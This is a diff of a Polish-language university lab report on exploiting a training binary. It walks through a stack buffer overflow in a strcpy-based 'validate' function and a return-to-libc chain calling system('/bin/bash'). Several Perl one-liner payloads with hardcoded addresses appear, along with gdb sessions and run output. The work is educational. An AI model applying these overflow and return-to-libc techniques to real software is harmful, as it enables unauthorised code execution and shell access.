@@ -178,7 +178,7 @@ Do osiągnięcia celu zostały podjęte kolejne kroki:
 
    Wykorzystano język [Perl](https://en.wikipedia.org/wiki/Perl). Podczas wywołania debuggera należało dokleić kawałek kodu:
     ```bash
-    gdb --args 55 `perl -e'print "1"x67 "\xd0\x87\x04\x08"'`
+    gdb --args 55 `perl -e'print "1"x67 . "\xd7\x85\x04\x08"'`
     ```
 
    Podawane jest 67 jedynek, a następnie adres funkcji `destroy world` (0x080485d7) zapisany bajtami zaczynając od najmniej znaczących (konwencja little-endian).
@@ -203,48 +203,72 @@ Do osiągnięcia celu zostały podjęte kolejne kroki:
 
    Potrzebne są:
    - Adres tesktu `/bin/bash`.
-      Debuggując program, można go znaleźć w funkcji `validate`, bo jest tam wyświetlany:
-      
-      `p system`
-      0xf7e3cda0
-      
-      `p/x bash`
-      0x080487d0
+      Debuggując program, można go znaleźć w funkcji `validate`, bo jest tam wyświetlany.
 
-      Budowa shellcode'u:
-      - 67 jedynek
-      - 4 bajty adresu funkcji `system`
-      <!-- - 4 dowolne bajty (nadpisanie adresu powrotu) / cokolwiek -->
-      - 4 bajty adresu tesktu "bin/bash"
-      - 4 bajty adresu funkcji exit
-      - 4 bajty zerowe (exit)
-
-      ```bash
-      gdb --args 55 `perl -e'print "1"x67 . "\xd7\x85\x04\x08" . "\x75\x44\x44\x44" . "\xa0\xcd\xe3\xf7" . "\xd0\x87\x04\x08" . "\x0\x0\x0\x0"'`
+      Fragment funkcji `validate`:
+	  ```
+      0x080485e9 <+18>:	mov    0x804a030,%eax
+   	  0x080485ee <+23>:	mov    %eax,(%esp)
+      0x080485f1 <+26>:	call   0x80484b4 <puts@plt>
       ```
+      
+      Sprawdzenie adresu tesktu:
+
+      `p/s *0x804a030`
+      
+      >0x80487d0:	"/bin/bash"
 
    - Adres funkcji `system`.
    
-      Szukamy adresu funkcji exit: `080484d4`
+      Szukamy adresu funkcji exit debbugując program: 
 
-      system
-      adres exit
-      bin/bash
+      `p system`
+      
+      >0x8048454
+
+
+3. Budowa shellcode'u:
+   - 67 jedynek
+   - 4 bajty adresu funkcji `system`: 0x08048454
+   - 4 bajty adresu tesktu "bin/bash": 0x080487d0
+   - 4 bajty adresu funkcji exit: 0x080484d4
+   - 4 bajty zerowe (exit): 0x00000000
+
+   ```bash
+   gdb --args 55 `perl -e 'print "1"x67 . "\x54\x84\x04\x08" . "\xd0\x87\x04\x08" . "\xd4\x84\x04\x08" . "\x0\x0\x0\x0"'`
+   ```
+
+
+   Program zakończył się pomyślnie:
+   ```
+   (gdb) r
+	Starting program: /workspace/55 1111111111111111111111111111111111111111111111111111111111111111111�
+	warning: Error disabling address space randomization: Operation not permitted
+	To continue you must provide security access token (21 digits)
+	sh: 1: ��������������������U��]Ít: not found
+	During startup program exited normally.
+   ```
 
 
 
 ## Podsumowanie
 
+Zadanie wymagało zrozumienia sekwencji odwołań do adresów w pamięci i struktury stosu. Pomimo niemałego progu wejścia w kontekście wiedzy, jaką trzeba posiadać do zdesasemblowanego programu, to ostateczne napisanie exploita nie było skomplikowane. Wykorzystuje on lukę w programie podmieniając kilka adresów na stosie.
 
-------------------
+
+
+
+
 
 <!-- Lab4
+
+	NOTATKI Z ZAJĘĆ
 
 na początku jest zmienna lokalna duża
 wywołanie: strcpy(ta zmienna lokalna, argument funkcji validate)
 
 Debuggujemy funkcję dla 67 jedynek
-```
+```bash
 gdb --args 55 `perl -e'print "1"x67'`
 disass validate # disassemble 
 b *0x080485c2 # ustawia breakpoint pod adresem ret w funkcji validate
@@ -252,7 +276,7 @@ r
 ```
 
 na samej górze adres powrotu
-```
+```bash
 p/x 8
 # chcemy wyświetlić to co jest na stosie
 p/x $esp
@@ -261,7 +285,7 @@ x/8x $esp # wyświetli 8 różnych wartości (8 słów w hexie, 8 rzędów po 4)
 ```
 
 Debuggujemy funkcję dla 66 jedynek
-```
+```bash
 gdb --args 55 `perl -e'print "1"x66'`
 disass validate # disassemble 
 b *0x080485c2 # ustawia breakpoint pod adresem ret w funkcji validate
@@ -288,13 +312,28 @@ możnaby podać parametr do funkcji exit
 uwaga: bajt zerowy kończy string
 
 
-
-
-system: 08048454
-bash: 0804a030
+system: 0x08048454
+bin/bash: 0x080487d0
 exit: 080484d4
+
+gdb --args 55 `perl -e 'print "1"x67 . "\x54\x84\x04\x08" . "\xd0\x87\x04\x08" . "\xd4\x84\x04\x08" . "\x0\x0\x0\x0"'`
+
+gdb --args 55 `perl -e 'print "1"x67 . "\x54\x84\x04\x08" . "\xd4\x84\x04\x08" . "\xd0\x87\x04\x08" . "\x0\x0\x0\x0"'`
+
 
 ./55 `perl -e'print "1"x67 . "\xd7\x85\x04\x08" . "\xd0\x87\x04\x08" . "\xd4\x84\x04\x08" . "\x0\x0\x0\x0"'`
 
+
+gdb --args 55 `perl -e 'print "1"x67 . "\x75\x44\x44\x44" . "\xa0\xcd\xe3\xf7" . "\xd0\x87\x04\x08" . "\x0\x0\x0\x0"'`
+
+
+80486fc
+
+
+
+DZIAŁA TEŻ:
+```bash
+gdb --args 55 `perl -e 'print "1"x67 . "\xf0\x86\x04\x08" . "\xfc\x86\x04\x08"'`
+```
 
 -->
